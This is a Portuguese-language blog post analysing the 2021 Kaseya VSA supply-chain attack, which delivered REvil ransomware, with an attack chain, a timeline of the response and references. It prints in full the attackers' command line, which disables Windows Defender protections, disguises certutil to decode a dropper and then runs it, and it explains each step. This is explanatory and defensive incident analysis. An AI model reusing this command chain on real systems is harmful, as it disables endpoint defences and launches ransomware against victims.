---
created: 2022-05-07T01:39:05 (UTC -03:00)
title: "Kaseya Supply Chain Attack"
tags: []
source: https://medium.com/@ualvesdias/kaseya-supply-chain-attack-c3ff050cbadf
author: Odysseus
---

# Introdução

Há alguns dias atrás, a comunidade de segurança ao redor do mundo precisou se ocupar com o apelidado [PrintNightmare](https://news.sophos.com/pt-br/2021/07/01/vulnerabilidade-printnightmare-o-que-fazer/). Uma falha crítica foi identificada no serviço de impressão do sistema operacional Windows e que afeta diversas versões do software, inclusive aquelas usadas em Domain Controllers.

Dois dias adentro, contudo, outro evento ocorreu que, a princípio, foi ofuscado pelo que já estava ocorrendo. Um ataque de proporções exponenciais ao software [VSA](https://www.kaseya.com/products/vsa/) da empresa [Kaseya](https://www.kaseya.com/) comprometeu milhares de clientes de dezenas de [MSPs](https://www.opservices.com.br/msps-managed-service-providers/) nos Estados Unidos.

De acordo com as fontes consultadas, o software VSA da empresa foi comprometido por um [0-day](https://www.fireeye.com/current-threats/what-is-a-zero-day-exploit.html) que permitiu que uma atualização falsa fosse emitida para os clientes dos MSPs que usam a opção _on premisses_. A imagem abaixo pode ilustrar melhor a cadeia de ataque:

![](https://miro.medium.com/max/700/1*-g54lZpCuxwF6_wRR5UAgQ.png)

Cadeia de ataque ao Kaseya VSA e clientes dos MSPs

Como pode ser visto acima, os atacantes exploraram dezenas de servidores VSA que estavam expostos na internet e induziram atualizações falsas aos agentes instalados nos clientes.

O mais agravante desse ataque é o fato de que os agentes nos clientes são executados com permissões elevadas, o que permite plenos poderes ao ataque. Com isso, foi possível, por exemplo, emitir comandos para desabilitar diversas proteções nos _endpoints_ afetados, como o Windows Defender.

# Detalhes Técnicos do Ataque

O ataque, inicialmente, explorou falhas como _bypass_ de mecanismo de autenticação, _upload_ de arquivos arbritários e até injeção de código nos servidores VSA.

A partir daí, um prodecimento foi agendado para enviar uma atualização falsa a todos os computadores gerenciados pelos servidores afetados. Tal atualização incluía ações de desabilitar proteções e download/desofuscação e execução de um [ransomware](https://www.kaspersky.com/resource-center/threats/ransomware) da gang [REvil](https://en.wikipedia.org/wiki/REvil), que opera o chamado _Ransomware-As-A-Service_, ou seja, eles vendem ransomware como um serviço. Abaixo temos parte dos comandos que foram executados nos clientes afetados:

```
execFile(): Path="C:\windows\system32\cmd.exe", arg="/c ping 127.0.0.1 -n 7615 > nul & C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y C:\Windows\System32\certutil.exe C:\Windows\cert.exe & echo %RANDOM% >> C:\Windows\cert.exe & C:\Windows\cert.exe -decode c:\kworking1\agent.crt c:\kworking1\agent.exe & del /q /f c:\kworking1\agent.crt C:\Windows\cert.exe & c:\kworking1\agent.exe", flag=0x00000002, timeout=0 seconds
```

Analisando o bloco acima:

-   _execFile(): Path=”C:\\windows\\system32\\cmd.exe”, arg=”/c ping 127.0.0.1 -n 7615 > null”_

A primeira parte do código invoca o _cmd.exe_ e passa como argumentos primeiramente o comando _ping_ para o localhost (127.0.0.1), especificando exatamente 7615 pacotes a serem enviados e descartando quaisquer saídas textuais (_\> null_). O objetivo desse comando _ping_ provavelmente é o de causar um atraso no processo de decodificação e execução do _dropper_ e do _ransomware_. Essa abordagem pode ser útil em alguns casos para enganar os mecanismos de defesa (que ainda estão ativos).

-   _C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_ **_Set-MpPreference_** _-_**_DisableRealtimeMonitoring_** _$true -_**_DisableIntrusionPreventionSystem_** _$true -_**_DisableIOAVProtection_** _$true -_**_DisableScriptScanning_** _$true -_**_EnableControlledFolderAccess_** _Disabled -_**_EnableNetworkProtection_** _AuditMode -Force -_**_MAPSReporting_** _Disabled -_**_SubmitSamplesConsent_** _NeverSend_

A seguir, ainda como argumento passado ao _cmd.exe_, é chamado o _powershell.exe,_ que executa o comando [**_Set-MpPreference_**](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps), que permite alterar configurações do Windows Defender. Para ele são passadas as opções a seguir:

-   \-**DisableRealtimeMonitoring** $true: Desabilita a proteção em tempo real.
-   \-**DisableIntrusionPreventionSystem** $true: desabilita proteção de rede para vulnerabilidades conhecidas.
-   \-**DisableIOAVProtection** $true: Desabilita a verificação de arquivos e anexos baixados.
-   \-**DisableScriptScanning** $true: desabilita a verificação de _scripts_ durante a verificação de _malware._
-   \-**EnableControlledFolderAccess** Disabled: Desabilita a proteção de arquivos contra _ransomware_ e outras ameaças.
-   \-**EnableNetworkProtection** AuditMode -Force: Desabilita a proteção contra acesso a domínios potencialmente perigosos e maliciosos, como domínios utilizados por campanhas de phishing, servidores de comando e controle e até mesmo de controle de _ransomware._
-   \-**MAPSReporting** Disabled: Desabilita o envio de informações ao [_Microsoft Active Protection Service (MAPS_](https://www.microsoft.com/security/blog/2015/01/14/maps-in-the-cloud-how-can-it-help-your-enterprise/)_)_
-   \-**SubmitSamplesConsent** NeverSend: Desabilita o envio automático de _samples_ para a Microsoft.

Após desabilitar as proteções, é iniciado o processo de execução do _ransomware_, que começa utilizando o comando a seguir:

-   _copy /Y C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe & echo %RANDOM% >> C:\\Windows\\cert.exe_

O comando acima cria uma cópia do utilitário _certutil.exe,_ cujo nome é _cert.exe._ Após isso, é acrescentado um número aleatório ao final do arquivo novo:

![](https://miro.medium.com/max/700/1*RqM9d8Qe0p-rQAchgLTteQ.png)

Manipulação do utilitário _certutil.exe_

A técnica acima pode ter sido feita para alterar a assinatura do executável original, já que, além do nome “certutil”, o _hash_ dele pode ser monitorado ativamente para detecção de execuções maliciosas.

-   _C:\\Windows\\cert.exe -decode c:\\kworking1\\agent.crt c:\\kworking1\\agent.exe & del /q /f c:\\kworking1\\agent.crt C:\\Windows\\cert.exe & c:\\kworking1\\agent.exe_

Seguindo o fluxo de execução, é possível ver que o novo arquivo _cert.exe_ é usado para realizar a decodificação _base64_ do arquivo _agent.crt_, que provavelmente foi colocado em todos os _endpoints_ afetados pelo processo de atualização falsa. Em seguida, o novo arquivo, _agent.exe,_ é criado e depois _agent.crt e cert.exe_ são deletados. Finalmente, _agent.exe_ é executado.

_agent.exe_ é um executável conhecido como _dropper_, que tem por função baixar e executar o código malicioso final, ou seja, o _ransomware._ Neste caso, ele baixou um executável legítimo do Windows Defenter, o _MsMpEng.exe_, e também uma DLL chamada _mpsvc.dll_, **que é o _ransomware_ propriamente dito**. Entretanto, legitimamente falando, [_MpSvc.dll_](https://www.fileinspect.com/fileinfo/mpsvc-dll/) é uma biblioteca que faz parte do _Windows Protection Service_, e é utilizada pelo Windows Defender. Esse mecanismo foi utilizado no ataque provavelmente como forma de execução disfarçada do _ransomware_.

A execução do arquivo _MsMpEng.exe_ carrega automaticamente a DLL _MpSvc.dll_, que inicia o processo de criptografia dos arquivos do sistema afetado.

Uma vez afetado, o sistema passa a ficar assim:

![](https://miro.medium.com/max/680/1*SUJhOu3hOeiRy-mMi3vdNA.png)

Sistema afetado pelo ransomware REvil no ataque de Suplly Chain do Kaseya VSA

![](https://miro.medium.com/max/700/1*trhkTGQ_NYzk_cOnuA17vQ.png)

Instruções de preço e pagamento pelo processo de descriptografia dos arquivos

# Evolução do Cenário

A partir do momento que foi detectado, a comunidade de segurança logo começou a agir para investigar o incidente e realizar medidas de mitigação do ataque. O que segue abaixo é uma _timeline_ de ações e notícias:

No dia 3 de julho a Kaseya [confirmou o ataque](https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021). A partir daí várias informações de impacto começaram a surgir:

-   Mais de 30 MSPs foram afetados ao redor do mundo;
-   Rede de supermercados sueca Coop fechou mais de 400 lojas na sexta-feira depois de seus pontos de venda e _checkouts_ terem parado de funcionar;
-   [11 escolas afetadas pelo ataque](https://www.nzherald.co.nz/nz/worldwide-ransomware-attack-st-peters-college-and-10-other-schools-hit-by-us-cyber-attack/JACHAD3OPGUOF7ZIF4PJXDPICA/);
-   Falha do software VSA provavelmente foi um 0-day de _bypass_ de mecanismo de autenticação da interface web;
-   Equipe de pesquisadores alemães estavam em processo de [_responsible disclosure_ com a Kaseya](https://twitter.com/0xDUDE/status/1411466263411544064?s=20) no momento do ataque;
-   A empresa _MawareBytes_ detecta um aumento considerável do uso do _ransonware_ REvil ao redor do mundo;

![](https://miro.medium.com/max/700/1*Bnjg70-AQk85tUqQNoOlvA.png)

Aumento de detecções do malware REvil

-   A gangue REvil se responsabilizou pelo ataque e exigiu a quantia de US$70.000.000,00 em BTC para liberar um _decryptor_ para todos os afetados;

![](https://miro.medium.com/max/698/1*tsdFjpgPB9ArqCyHyxCD5A.png)

-   A Kaseya liberou no dia 5 de julho uma ferramenta de [detecção de comprometimento](https://kaseya.app.box.com/s/0ysvgss7w48nxh8k1xt7fqhbcjxhas40), mas pede que todos os servidores VSA _on premisses_ permaneçam _offline_.
-   A empresa [HuntressLabs](https://www.huntress.com/), por meio do [_update_ 12 na _thread_ no Reddit](https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/), afirmou que o vetor inicial de ataque foi um _bypass_ no mecanismo de autenticação da interface web, garantindo uma sessão autenticada ao atacante e, após isto, realizar o _upload_ do _payload_ original e executar comandos via falhas de SQL _injection_.

# Conclusão

A investigação ainda está em andamento, até o momento da escrita deste post, mas já é possível dizer que este é um dos maiores ataques cibernéticos da história.

Assim que mais atualizações forem acontecendo, eu altero o post original para incluir os avanços.

# Referências

-   [Kaseya supply chain attack targeting MSPs to deliver REvil ransomware — TRUESEC Blog](https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/)
-   [Kaseya supply chain attack delivers mass ransomware event to US companies](https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b)
-   [Mark Loman @🏡 no Twitter: “If your endpoint is hit, the initial ransom demand is 44,999 USD. https://t.co/gSWbxYJbeX" / Twitter](https://twitter.com/markloman/status/1411053456983564300)
-   [Crticial Ransomware Incident in Progress : msp (reddit.com)](https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/)
-   [UPDATED: Thousands attacked as REvil ransomware hijacks Kaseya VSA — Malwarebytes Labs | Malwarebytes Labs](https://blog.malwarebytes.com/cybercrime/2021/07/shutdown-kaseya-vsa-servers-now-amidst-cascading-revil-attack-against-msps-clients/#detection-tool)
-   [Nicole Perlroth no Twitter: “As it turns out, the “zero day” used to breach Kesaya wasn’t a zero day. Dutch researchers tipped the company off to the issue, but Kesaya still hadn’t rolled out a patch when REvil used it for its ransomware spree.” / Twitter](https://twitter.com/nicoleperlroth/status/1411461006786588673)
-   [Worldwide ransomware attack: St Peter’s College and 10 other schools hit by US cyber attack — NZ Herald](https://www.nzherald.co.nz/nz/worldwide-ransomware-attack-st-peters-college-and-10-other-schools-hit-by-us-cyber-attack/JACHAD3OPGUOF7ZIF4PJXDPICA/)
-   [Important Notice July 4th, 2021 — Kaseya](https://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689-Important-Notice-July-2nd-2021)
-   [Set-MpPreference (Defender) | Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2019-ps)
-   [Ativar a proteção de rede | Microsoft Docs](https://docs.microsoft.com/pt-br/microsoft-365/security/defender-endpoint/enable-network-protection?view=o365-worldwide)
-   [MpSvc.dll — What is MpSvc.dll? — Service Module (fileinspect.com)](https://www.fileinspect.com/fileinfo/mpsvc-dll/)
